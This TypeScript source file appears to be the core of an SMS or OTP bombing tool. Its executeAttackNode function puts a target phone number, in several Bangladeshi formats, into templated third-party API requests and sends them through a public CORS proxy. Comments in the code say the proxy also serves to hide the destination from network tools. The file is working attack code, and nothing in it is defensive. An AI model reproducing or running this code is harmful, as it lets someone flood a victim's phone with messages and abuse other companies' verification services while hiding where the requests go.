import { ApiNode } from '../types';

// Centralized Proxy Gateway
const PROXY_GATEWAY = "https://corsproxy.io/?";

export const executeAttackNode = async (node: ApiNode, phone: string, signal: AbortSignal): Promise<{ ok: boolean, status: number, error?: string }> => {
    const raw = phone.replace(/^(\+88|88)/, ''); 
    const p88 = `88${raw}`; 
    const pp88 = `+88${raw}`; 

    // Replace placeholders
    let body = node.body
      .replace(/{phone}/g, raw)
      .replace(/{phone_88}/g, p88)
      .replace(/{phone_p88}/g, pp88);
    
    let url = node.url
      .replace(/{phone}/g, raw)
      .replace(/{phone_88}/g, p88)
      .replace(/{phone_p88}/g, pp88);

    let headers = {};
    try { headers = JSON.parse(node.headers); } catch (e) { }

    const isGet = node.method === 'GET';

    try {
        // We use the proxy to ensure the browser allows the request (CORS) 
        // and to obscure the destination in the "Host" column of network tools, 
        // though the full URL is still visible in the query string.
        const encodedTarget = encodeURIComponent(url);
        const finalUrl = `${PROXY_GATEWAY}${encodedTarget}`;

        const response = await fetch(finalUrl, {
            method: node.method,
            headers: headers,
            body: !isGet ? body : undefined,
            signal,
            cache: 'no-store',
            referrerPolicy: 'no-referrer'
        });
        
        // Handle opaque responses (common with some proxies or no-cors modes)
        if (response.type === 'opaque') {
            return { ok: true, status: 0 };
        }
        
        return { 
            ok: response.ok, 
            status: response.status 
        };
    } catch (e: any) {
        if (e.name === 'AbortError') throw e;
        return { 
            ok: false, 
            status: -1, 
            error: e.message 
        };
    }
};